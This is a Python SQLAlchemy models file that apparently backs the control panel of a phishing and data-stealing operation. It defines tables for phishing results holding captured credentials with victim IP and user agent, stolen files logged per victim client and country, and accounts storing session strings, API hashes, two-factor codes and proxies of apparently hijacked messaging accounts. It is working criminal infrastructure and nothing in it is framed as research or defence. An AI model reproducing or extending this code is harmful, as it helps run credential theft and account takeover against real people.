from sqlalchemy import Column, Integer, String, Boolean, DateTime, Text, JSON
from sqlalchemy.ext.declarative import declarative_base
from datetime import datetime

print("🔄 Loading database models...")

# Створи локальний Base
Base = declarative_base()

class Admin(Base):
    __tablename__ = 'admins'
    
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True, nullable=False)
    password_hash = Column(String(255), nullable=False)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_login = Column(DateTime)

class Account(Base):
    __tablename__ = 'accounts'
    
    id = Column(Integer, primary_key=True)
    phone = Column(String(20), unique=True)
    session_string = Column(Text)
    app_id = Column(Integer)
    app_hash = Column(String(100))
    twofa = Column(String(100))
    proxy = Column(JSON)
    is_authorized = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_activity = Column(DateTime)

class PhishingResult(Base):
    __tablename__ = 'phishing_results'
    
    id = Column(Integer, primary_key=True)
    bot_type = Column(String(50))
    credentials = Column(JSON)
    ip_address = Column(String(45))
    user_agent = Column(Text)
    timestamp = Column(DateTime, default=datetime.utcnow)

class StolenFile(Base):
    __tablename__ = 'stolen_files'
    
    id = Column(Integer, primary_key=True)
    client_id = Column(String(100))
    ip_address = Column(String(45))
    country = Column(String(100))
    data_type = Column(String(50))
    file_path = Column(String(500))
    file_size = Column(Integer)
    created_at = Column(DateTime, default=datetime.utcnow)

class Service(Base):
    __tablename__ = 'services'
    
    id = Column(Integer, primary_key=True)
    name = Column(String(100), nullable=False)
    service_type = Column(String(50))
    status = Column(String(20), default='stopped')
    config = Column(JSON)
    created_at = Column(DateTime, default=datetime.utcnow)
    last_started = Column(DateTime)

class SystemLog(Base):
    __tablename__ = 'system_logs'
    
    id = Column(Integer, primary_key=True)
    level = Column(String(20))
    module = Column(String(100))
    message = Column(Text)
    timestamp = Column(DateTime, default=datetime.utcnow)

print("✅ Database models loaded successfully")